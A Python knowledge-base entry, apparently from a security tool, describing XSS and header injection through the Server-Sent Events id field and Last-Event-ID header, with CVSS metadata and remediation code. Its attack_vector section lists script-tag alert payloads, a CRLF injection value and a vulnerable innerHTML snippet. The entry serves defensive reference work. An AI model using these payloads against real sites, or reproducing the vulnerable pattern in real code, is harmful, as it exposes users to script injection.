#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: SSE ID Field XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via SSE ID Field",
    "severity": "medium",
    "cvss_score": 6.0,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "sse", "eventsource", "id", "lastEventId"],
    "description": """
SSE ID field XSS occurs when the id: field value is reflected or sent back to
the server via Last-Event-ID header. Can lead to XSS or header injection.

SEVERITY: MEDIUM
ID field is used for reconnection. lastEventId is sent back to server.
Can be used for header injection if server reflects it.
""",
    "attack_vector": """
ID REFLECTION:
id: <script>alert(1)</script>
data: test
// If lastEventId shown in DOM

LAST-EVENT-ID HEADER:
// Client reconnects with:
Last-Event-ID: <script>alert(1)</script>
// If server reflects in response

ID IN DEBUG:
source.onmessage = (e) => {
  debug.innerHTML = `Last ID: ${e.lastEventId}`;
};

CRLF VIA ID:
id: test\\r\\nX-Injected: header
data: test

ID IN URL:
// After reconnect:
/events?lastId=<script>alert(1)</script>

ID LOGGING:
id: </script><script>alert(1)</script>
data: test
// If logged in HTML page
""",
    "remediation": """
DEFENSE:

1. VALIDATE ID format (alphanumeric only)
2. Don't reflect lastEventId in DOM
3. Encode ID before using
4. Sanitize Last-Event-ID header server-side
5. Use numeric IDs only

SAFE PATTERN:
source.onmessage = (e) => {
  // Don't display lastEventId directly
  const id = e.lastEventId || '0';
  if (/^[0-9]+$/.test(id)) {
    lastId = id;
  }
};

SERVER VALIDATION:
def get_events(request):
    last_id = request.headers.get('Last-Event-ID', '0')
    # Validate: must be numeric
    if not last_id.isdigit():
        last_id = '0'
    return stream_events(int(last_id))

ID FORMAT:
id: 12345
data: test
# Use only numeric IDs

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
""",
}
